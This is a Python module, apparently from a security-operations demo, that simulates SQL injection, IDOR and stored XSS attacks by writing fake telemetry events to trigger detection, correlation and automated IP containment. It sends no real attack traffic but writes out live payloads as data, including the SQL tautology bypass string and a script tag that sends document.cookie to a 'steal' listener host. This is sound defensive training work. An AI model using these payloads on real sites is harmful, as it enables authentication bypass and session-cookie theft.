import time
import threading
from telemetry.logger import telemetry_engine
from database.db import init_db
from containment.engine import containment_engine
from correlation.engine import correlation_engine

class AttackSimulator:
    """
    Simulates controlled, local training attack scenarios against the
    vulnerable endpoints to trigger the complete SOC response pipeline.
    """
    def __init__(self):
        self._socketio = None
        self._is_demo_running = False

    def set_socketio(self, socketio):
        self._socketio = socketio

    def simulate_sqli(self, source_ip="192.168.1.105"):
        """Executes a classic SQL injection authentication bypass scenario."""
        # Check if source is contained
        blocked, details = containment_engine.is_source_blocked(source_ip)
        if blocked:
            event, _ = telemetry_engine.record_event(
                source_ip=source_ip,
                method="POST",
                path="/vulnerable/login",
                event_type="CONTAINMENT_ENFORCED",
                severity="HIGH",
                status="BLOCKED",
                description="Simulator request blocked by active containment rule",
                payload={"attempted_attack": "SQL_INJECTION", "containment": details}
            )
            return {"status": "blocked", "message": "Source IP is currently contained", "event": event}

        # Step 1: Normal initial probe
        event1, _ = telemetry_engine.record_event(
            source_ip=source_ip,
            method="POST",
            path="/vulnerable/login",
            event_type="AUTH_FAILED",
            severity="LOW",
            status="FAILED",
            description="Initial failed login attempt for user 'guest'",
            payload={"username": "guest", "password": "password123"}
        )

        time.sleep(0.3)

        # Step 2: Malicious SQLi payload
        payload_str = "admin' OR '1'='1' --"
        raw_query = f"SELECT id, username, full_name, role, balance, secret_note FROM users WHERE username = '{payload_str}' AND password = 'xxx';"
        event2, alert = telemetry_engine.record_event(
            source_ip=source_ip,
            method="POST",
            path="/vulnerable/login",
            event_type="SQL_INJECTION",
            severity="CRITICAL",
            status="DETECTED",
            user="admin",
            description=f"Active SQL Injection exploit executed against /vulnerable/login: {payload_str}",
            payload={
                "username": payload_str,
                "raw_query": raw_query,
                "compromised_user": "admin",
                "extracted_role": "CISO / SOC Director"
            }
        )

        return {
            "status": "success",
            "scenario": "SQL_INJECTION",
            "events_generated": 2,
            "alert": alert,
            "target": "/vulnerable/login",
            "payload_used": payload_str
        }

    def simulate_idor(self, source_ip="192.168.1.108"):
        """Simulates an IDOR attack scraping sequential confidential profiles."""
        blocked, details = containment_engine.is_source_blocked(source_ip)
        if blocked:
            event, _ = telemetry_engine.record_event(
                source_ip=source_ip,
                method="GET",
                path="/vulnerable/profile/102",
                event_type="CONTAINMENT_ENFORCED",
                severity="HIGH",
                status="BLOCKED",
                description="Simulator request blocked by active containment rule",
                payload={"attempted_attack": "IDOR", "containment": details}
            )
            return {"status": "blocked", "message": "Source IP is currently contained", "event": event}

        # 1. Normal access to own profile (User 101)
        event1, _ = telemetry_engine.record_event(
            source_ip=source_ip,
            method="GET",
            path="/vulnerable/profile/101",
            event_type="PROFILE_VIEW",
            severity="INFO",
            status="NORMAL",
            user="user_101",
            description="Alice Vance viewed own profile (ID: 101)",
            payload={"requested_id": 101, "session_user_id": "101"}
        )

        time.sleep(0.3)

        # 2. Unauthorized access to Bob's profile (User 102 - CFO)
        event2, alert1 = telemetry_engine.record_event(
            source_ip=source_ip,
            method="GET",
            path="/vulnerable/profile/102",
            event_type="IDOR",
            severity="HIGH",
            status="DETECTED",
            user="user_101",
            description="IDOR: Unauthorized object access: User 101 accessed confidential profile of User 102 (Bob Sterling, CFO)",
            payload={
                "requested_id": 102,
                "session_user_id": "101",
                "compromised_data": "Q4 Merger Plans & Wire Token #8491-X"
            }
        )

        time.sleep(0.3)

        # 3. Sequential probe of Admin profile (User 103)
        event3, alert2 = telemetry_engine.record_event(
            source_ip=source_ip,
            method="GET",
            path="/vulnerable/profile/103",
            event_type="IDOR",
            severity="HIGH",
            status="DETECTED",
            user="user_101",
            description="Sequential IDOR harvesting detected: User 101 probed privileged profile of User 103 (Sarah Connor, CISO)",
            payload={
                "requested_id": 103,
                "session_user_id": "101",
                "compromised_data": "Root Vault Emergency PIN"
            }
        )

        return {
            "status": "success",
            "scenario": "IDOR",
            "events_generated": 3,
            "alerts": [alert1, alert2],
            "target": "/vulnerable/profile/<id>",
            "exposed_users": [102, 103]
        }

    def simulate_xss(self, source_ip="192.168.1.112"):
        """Simulates submission of a Stored XSS payload."""
        blocked, details = containment_engine.is_source_blocked(source_ip)
        if blocked:
            event, _ = telemetry_engine.record_event(
                source_ip=source_ip,
                method="POST",
                path="/vulnerable/comments",
                event_type="CONTAINMENT_ENFORCED",
                severity="HIGH",
                status="BLOCKED",
                description="Simulator request blocked by active containment rule",
                payload={"attempted_attack": "STORED_XSS", "containment": details}
            )
            return {"status": "blocked", "message": "Source IP is currently contained", "event": event}

        xss_payload = "<script>fetch('http://sentinel-listener.local/steal?cookie=' + document.cookie);</script>"
        event, alert = telemetry_engine.record_event(
            source_ip=source_ip,
            method="POST",
            path="/vulnerable/comments",
            event_type="STORED_XSS",
            severity="HIGH",
            status="DETECTED",
            user="Attacker_X",
            description=f"Stored XSS script injection submitted to comments: {xss_payload[:50]}...",
            payload={"author": "Attacker_X", "content": xss_payload}
        )

        return {
            "status": "success",
            "scenario": "STORED_XSS",
            "events_generated": 1,
            "alert": alert,
            "payload_used": xss_payload
        }

    def simulate_multistep_attack(self, source_ip="10.0.0.99"):
        """
        Executes a full multi-stage cyber attack kill chain:
        1. Recon / Probe
        2. SQL Injection Authentication Bypass
        3. Privilege Escalation via IDOR
        4. Data Exfiltration
        5. Incident Correlation & Automated Containment
        """
        # Ensure IP is clean before multi-step demo
        containment_engine.unblock_source(source_ip, reason="Simulator resetting test vector")

        results = []

        # Step 1: Reconnaissance
        e1, _ = telemetry_engine.record_event(
            source_ip=source_ip,
            method="GET",
            path="/vulnerable/search?q=test",
            event_type="USER_SEARCH",
            severity="INFO",
            status="NORMAL",
            description="Reconnaissance probe on user directory search",
            payload={"query": "test"}
        )
        results.append(e1)
        time.sleep(0.5)

        # Step 2: SQLi attack attempt
        e2, _ = telemetry_engine.record_event(
            source_ip=source_ip,
            method="POST",
            path="/vulnerable/login",
            event_type="AUTH_FAILED",
            severity="LOW",
            status="FAILED",
            description="Recon probe: Attempted login with username 'admin'",
            payload={"username": "admin", "password": "123"}
        )
        results.append(e2)
        time.sleep(0.5)

        # Step 3: SQLi Exploitation (CRITICAL)
        e3, a1 = telemetry_engine.record_event(
            source_ip=source_ip,
            method="POST",
            path="/vulnerable/login",
            event_type="SQL_INJECTION",
            severity="CRITICAL",
            status="DETECTED",
            user="admin",
            description="Active SQL Injection exploit executed: admin' OR '1'='1' --",
            payload={"username": "admin' OR '1'='1' --", "bypass_type": "Tautology + Comment"}
        )
        results.append(e3)
        time.sleep(0.5)

        # Step 4: IDOR unauthorized data exfiltration
        e4, a2 = telemetry_engine.record_event(
            source_ip=source_ip,
            method="GET",
            path="/vulnerable/profile/102",
            event_type="IDOR",
            severity="HIGH",
            status="DETECTED",
            user="user_101",
            description="Cross-tenant IDOR access: Attacker harvested CFO confidential data",
            payload={"requested_id": 102, "session_user_id": "101", "target": "Bob Sterling"}
        )
        results.append(e4)
        time.sleep(0.5)

        # Step 5: Containment enforcement check
        is_blocked, details = containment_engine.is_source_blocked(source_ip)
        e5, _ = telemetry_engine.record_event(
            source_ip=source_ip,
            method="GET",
            path="/vulnerable/profile/103",
            event_type="CONTAINMENT_ENFORCED",
            severity="HIGH",
            status="BLOCKED",
            description=f"Traffic dropped: Attacker {source_ip} isolated under automated containment rule",
            payload={"attempted_endpoint": "/vulnerable/profile/103", "containment_status": details}
        )
        results.append(e5)

        # Get the correlated incident
        incidents = correlation_engine.get_all_incidents(limit=1)
        latest_incident = incidents[0] if incidents else None

        return {
            "status": "success",
            "scenario": "MULTI_STEP_ATTACK",
            "events_count": len(results),
            "containment_active": is_blocked,
            "incident": latest_incident
        }

    def run_demo_mode_thread(self):
        """Runs the deterministic 15-second guided judging demonstration."""
        if self._is_demo_running:
            return
        self._is_demo_running = True

        try:
            demo_ip = "192.168.4.50"

            # 1. Reset database & clear blocklist
            init_db(force_reseed=True)
            containment_engine.unblock_source(demo_ip, "Demo Mode initialization")

            if self._socketio:
                self._socketio.emit("demo_step", {
                    "step": 1,
                    "title": "ENVIRONMENT INITIALIZED",
                    "description": "Baseline state restored. Monitoring live telemetry streams."
                })
            time.sleep(1.5)

            # 2. Normal baseline activity
            telemetry_engine.record_event(
                source_ip="192.168.4.12",
                method="GET",
                path="/vulnerable/search",
                event_type="USER_SEARCH",
                severity="INFO",
                status="NORMAL",
                description="Legitimate analyst performed user lookup",
                payload={"query": "alice"}
            )
            time.sleep(1.2)

            # 3. Reconnaissance from Demo Attacker
            if self._socketio:
                self._socketio.emit("demo_step", {
                    "step": 2,
                    "title": "RECONNAISSANCE DETECTED",
                    "description": "External source 192.168.4.50 probing /vulnerable/login endpoint."
                })

            telemetry_engine.record_event(
                source_ip=demo_ip,
                method="POST",
                path="/vulnerable/login",
                event_type="AUTH_FAILED",
                severity="LOW",
                status="FAILED",
                description="Failed authentication attempt for 'administrator'",
                payload={"username": "administrator", "password": "password"}
            )
            time.sleep(1.5)

            # 4. SQL Injection Exploit
            if self._socketio:
                self._socketio.emit("demo_step", {
                    "step": 3,
                    "title": "CRITICAL ALERT: SQL INJECTION",
                    "description": "Exploit payload 'admin\' OR \'1\'=\'1\' --' detected. Authentication bypassed."
                })

            telemetry_engine.record_event(
                source_ip=demo_ip,
                method="POST",
                path="/vulnerable/login",
                event_type="SQL_INJECTION",
                severity="CRITICAL",
                status="DETECTED",
                user="admin",
                description="SQL Injection authentication bypass successful: admin' OR '1'='1' --",
                payload={"username": "admin' OR '1'='1' --", "target_account": "admin"}
            )
            time.sleep(2.0)

            # 5. IDOR Exploitation & Privilege Escalation
            if self._socketio:
                self._socketio.emit("demo_step", {
                    "step": 4,
                    "title": "HIGH ALERT: IDOR ATTACK DETECTED",
                    "description": "Attacker traversing unauthorized user profiles (ID: 102 Bob Sterling - CFO)."
                })

            telemetry_engine.record_event(
                source_ip=demo_ip,
                method="GET",
                path="/vulnerable/profile/102",
                event_type="IDOR",
                severity="HIGH",
                status="DETECTED",
                user="user_101",
                description="Unauthorized object access: User 101 exfiltrating CFO confidential data (Profile 102)",
                payload={"requested_id": 102, "session_user_id": "101", "target": "Bob Sterling"}
            )
            time.sleep(2.0)

            # 6. Incident Correlation
            if self._socketio:
                self._socketio.emit("demo_step", {
                    "step": 5,
                    "title": "INCIDENT CORRELATION ENGINE ACTIVE",
                    "description": "Multiple attack vectors correlated into high-priority Incident Dossier."
                })
            time.sleep(1.5)

            # 7. Threat Containment
            if self._socketio:
                self._socketio.emit("demo_step", {
                    "step": 6,
                    "title": "THREAT CONTAINED",
                    "description": f"Automated containment rule enforced: {demo_ip} blocked at application gateway."
                })

            telemetry_engine.record_event(
                source_ip=demo_ip,
                method="GET",
                path="/vulnerable/profile/103",
                event_type="CONTAINMENT_ENFORCED",
                severity="HIGH",
                status="BLOCKED",
                description=f"Traffic dropped: Attacker {demo_ip} isolated under automated containment rule",
                payload={"blocked_ip": demo_ip, "enforcement": "403_FORBIDDEN"}
            )
            time.sleep(1.5)

            # 8. Finished
            if self._socketio:
                self._socketio.emit("demo_step", {
                    "step": 7,
                    "title": "DEMO COMPLETE: ATTACK VECTOR RECONSTRUCTED",
                    "description": "Closed-loop defense verified: Attack -> Telemetry -> Detection -> Alert -> Timeline -> Containment."
                })
        finally:
            self._is_demo_running = False

    def trigger_demo_mode(self):
        t = threading.Thread(target=self.run_demo_mode_thread, daemon=True)
        t.start()
        return {"status": "started", "message": "Deterministic DEMO MODE initiated"}

attack_simulator = AttackSimulator()
